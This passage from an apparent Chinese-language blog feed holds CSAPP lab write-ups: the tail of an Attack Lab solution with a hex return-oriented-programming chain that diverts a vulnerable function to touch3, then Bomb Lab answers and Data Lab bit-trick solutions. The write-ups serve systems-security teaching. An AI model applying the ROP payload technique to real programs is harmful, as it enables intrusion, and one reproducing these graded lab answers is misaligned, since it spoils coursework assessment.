class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* the data are pop to r15 */</span></span><br><span class="line"><span class="comment">/* after all pop, rsp is K+16 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */</span></span><br><span class="line"></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019a2, movq rax, rdi */</span></span><br><span class="line"></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */</span></span><br><span class="line"></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4019c5, mov rax, rdi */</span></span><br><span class="line"></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 4018fa touch3 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x59b997fa in here */</span></span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ul><li><p>把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后</p></li><li><p>用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的<code>lea (%rdi,%rsi,1),%rax</code>符合要求</p></li><li><p>为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到<code>pop %r14</code>，该指令第二个字节<code>5e</code>是<code>pop %rsi</code>，因为该指令跟ret之间还有<code>pop %r15</code>，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。</p><blockquote><p>r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）</p></blockquote></li><li><p>之后用多个mov，实现rsp mov到rax再mov到rdi</p></li><li><p>然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi</p></li><li><p>接着就是touch3的地址，让<code>mov rax rdi</code>下面那条ret直接跳转到touch3，攻击成功</p></li></ul><h3 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h3><ul><li>用vim的16进制编辑模式要加在打开vim时加<code>-b</code>，否则，会把诸如<code>c0</code>这一类大于<code>0x3f</code>的不属于ascii范围的字符修改成<code>3f</code></li></ul><ul><li>ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节</li><li>指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址</li><li>ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置</li><li>注意gets遇到编码为0xFF的字符时不会终止读取</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 攻击实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="https://h-zex.github.io/2017/09/15/CSAPP-Bomb-Lab/"/>
    <id>https://h-zex.github.io/2017/09/15/CSAPP-Bomb-Lab/</id>
    <published>2017-09-14T18:04:11.000Z</published>
    <updated>2018-08-04T04:48:35.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-Bomb-Lab"><a href="#CSAPP-Bomb-Lab" class="headerlink" title="CSAPP Bomb Lab"></a>CSAPP Bomb Lab</h1><h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><ol><li>Border relations with Canada have never been better.</li><li>1 2 4 8 16 32</li><li>多个答案<ul><li>0    207</li><li>1    311</li><li>2    707</li><li>3    256</li><li>4    389</li><li>5    206</li><li>6    682</li><li>7    327</li></ul></li><li><em>应该有多个答案</em><ul><li>7    0</li></ul></li><li>一个6个字符的字符串，字符串的ascii值依次为<ul><li>$9+k\times16$ </li><li>$15+k\times16$</li><li>$14+k\times16$</li><li>$5+k\times16$</li><li>$6+k\times16$</li><li>$7+k\times16$</li></ul></li><li>​      4 3 2 1 6 5</li></ol><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><h4 id="解答思路"><a href="#解答思路" class="headerlink" title="解答思路"></a>解答思路</h4><ul><li>string_not_equal函数比对(0x402400)位置的string与输入的string</li><li>直接运行gdb，<code>print (char*)0x402400</code>即可</li><li><em>不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333</em></li></ul><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><h4 id="解答思路-1"><a href="#解答思路-1" class="headerlink" title="解答思路"></a>解答思路</h4><ul><li>汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入<code>1  2  4  8  16  32</code>即可AC</li></ul><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea    0xc(%rsp),%rcx //rcx=12+rsp</span><br><span class="line">lea    0x8(%rsp),%rdx //rdx=8+rsp</span><br><span class="line">mov    $0x4025cf,%esi //%d %d</span><br><span class="line">mov    $0x0,%eax</span><br><span class="line">callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure><p>从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb<code>print (char*)0x4025cf</code>打印出<code>&quot;%d %d&quot;</code></p></li><li><p>然后测试读入的第一个数字是否大于7，如果是，explode_bomb</p></li><li><p>然后就是一个switch，用gdb<code>x/14w 0x402470</code>打印出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x402470:0x00400f7c0x000000000x00400fb90x00000000</span><br><span class="line">0x402480:0x00400f830x000000000x00400f8a0x00000000</span><br><span class="line">0x402490:0x00400f910x000000000x00400f980x00000000</span><br><span class="line">0x4024a0:0x00400f9f0x00000000</span><br></pre></td></tr></table></figure><p>按照对应关系确定第二个读入的数字即可</p></li></ul><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>同样是用sscanf读入两个数字</li><li>由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果</li></ul><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">callq  40131b &lt;string_length&gt;</span><br><span class="line">cmp    $0x6,%eax</span><br></pre></td></tr></table></figure><p>读入6个字符的字符串</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">mov    %cl,(%rsp)</span><br><span class="line">mov    (%rsp),%rdx</span><br><span class="line">and    $0xf,%edx</span><br><span class="line">movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure><p>提取每个字符的ascii的低4bits，放在<code>edx</code>里，然后从<code>0x4024b0+edx</code>的位置读入数据放在栈上</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x40245e,%esi</span><br><span class="line">lea    0x10(%rsp),%rdi</span><br><span class="line">callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure><p>后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。</p></li><li><p>用gdb分别打印0x4024b0  0x40245e处的字符串，获得</p><ul><li><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></li><li><code>flyers</code></li></ul></li><li><p>此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与<code>flyers</code>比对。偏移量依次为$9\ 15\ 14\ 5\ 6\ 7$</p></li><li><p>但是这些字符不可打印出来，所以我们需要加上$16\times k$来获得可打印的字符</p></li></ul><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><h4 id="一些心得"><a href="#一些心得" class="headerlink" title="一些心得"></a>一些心得</h4><ul><li><p>不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#from 代码段的401153</span><br><span class="line">lea    0x18(%rsp),%rsi</span><br><span class="line">mov    %r14,%rax</span><br><span class="line">mov    $0x7,%ecx</span><br><span class="line"></span><br><span class="line">mov    %ecx,%edx</span><br><span class="line">sub    (%rax),%edx</span><br><span class="line">mov    %edx,(%rax)</span><br><span class="line">add    $0x4,%rax</span><br><span class="line">cmp    %rsi,%rax</span><br><span class="line">jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure><p>大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能</p></li><li><p>安利一个gdb插件<a href="https://github.com/longld/peda" target="_blank" rel="noopener">peda</a>，大大提高gdb的用户体验</p></li></ul><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><p>整段代码分为 个部分</p><ul><li><p>0x4010fc 到 0x401106：读入6个数值</p></li><li><p>0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）</p></li><li><p>0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）</p></li><li><p>0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。</p><p>其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令<code>x/30w 0x6032d0</code>打印改地址附近的多个字节，结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:0x0000014c0x000000010x006032e00x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:0x000000a80x000000020x006032f00x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:0x0000039c0x000000030x006033000x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:0x000002b30x000000040x006033100x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:0x000001dd0x000000050x006033200x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:0x000001bb0x000000060x000000000x00000000</span><br></pre></td></tr></table></figure><p>可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。</p><p>由此可以知道该段代码的功能为<strong>把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定</strong>。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。</p><p><strong>node地址在栈上关于读入的数字的分布规则为</strong></p><ul><li>node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0</li><li>node地址按照读入数字的顺序，排列在栈上。</li></ul></li><li><p>0x4011ab 到 0x4011d9：该段从<code>%rsp+0x20</code>开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line">node *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">node **next = %rsp+<span class="number">0x28</span>;</span><br><span class="line">node **endnode = %rsp+<span class="number">0x50</span>;</span><br><span class="line">node *currentnode = *(%rsp+<span class="number">0x20</span>);</span><br><span class="line">node *temp;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">temp = *next;</span><br><span class="line">currentnode-&gt;next = temp;</span><br><span class="line">next += <span class="number">1</span>;<span class="comment">//in fact, it add 8 bytes;</span></span><br><span class="line"><span class="keyword">if</span>(endnode==next)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">currentnode = temp;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = null;</span><br></pre></td></tr></table></figure></li><li><p>0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 炸弹实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="https://h-zex.github.io/2017/09/13/CSAPP-Data-Lab/"/>
    <id>https://h-zex.github.io/2017/09/13/CSAPP-Data-Lab/</id>
    <published>2017-09-13T05:39:11.000Z</published>
    <updated>2018-08-04T04:48:35.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-data-Lab"><a href="#CSAPP-data-Lab" class="headerlink" title="CSAPP data Lab"></a>CSAPP data Lab</h1><blockquote><p>注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。</p></blockquote><h3 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x|~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>德摩根定律</li></ul><h3 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> bias = n&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> (x&gt;&gt;bias)&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>移位到最低的1byte然后用0xFF提取</li></ul><h3 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class="line"><span class="comment">i</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span>&lt;&lt;<span class="number">32</span>+~n&lt;&lt;<span class="number">1</span>)+~<span class="number">0</span> &amp; (x&gt;&gt;n);</span><br><span class="line">  <span class="comment">//equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n);</span></span><br><span class="line">  <span class="comment">//负号优先级高于移位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ul><li><p>因为不能用<code>-</code>，所以用取反加一代替取负</p></li><li><p>构造低<code>32-n</code>bit的1来提取移位后的数值</p></li><li><p>因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位</p><blockquote><p>小技巧，如果n移位k，k$\in$[0, 32]，则可以<code>n&gt;&gt;(k-!!k)&gt;&gt;!!k</code></p></blockquote></li></ul><h3 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mark1 = <span class="number">0x55</span>;</span><br><span class="line"><span class="keyword">int</span> mark2 = <span class="number">0x33</span>;</span><br><span class="line"><span class="keyword">int</span> mark3 = <span class="number">0x0F</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">x = (x&gt;&gt;<span class="number">1</span>&amp;mark1)+(x&amp;mark1);<span class="comment">//every two bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">2</span>&amp;mark2)+(x&amp;mark2);<span class="comment">//every four bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">4</span>&amp;mark3)+(x&amp;mark3);<span class="comment">//every eight bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">8</span>)+x;<span class="comment">//every 16 bits; record in the low 8 bits;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">16</span>)+x;<span class="comment">//every 32 bits; record in the low 8 bits;</span></span><br><span class="line"><span class="keyword">return</span> x&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ul><li>构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目</li><li>同样的思路，提取每四位的low bit、high bit，然后相加</li><li>因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果</li></ul><h3 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">return</span> ~x&amp;<span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ul><li>如果非0，位模式从最高位的1到最低位都填充为1，</li><li>如果为0，则位模式还是保持全0</li></ul><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fitBits"><a href="#fitBits" class="headerlink" title="fitBits"></a>fitBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class="line"><span class="comment"> *  n-bit, two's complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(x&gt;&gt;n+~<span class="number">0</span>)|!((x&gt;&gt;n+~<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-5"><a href="#思路-5" class="headerlink" 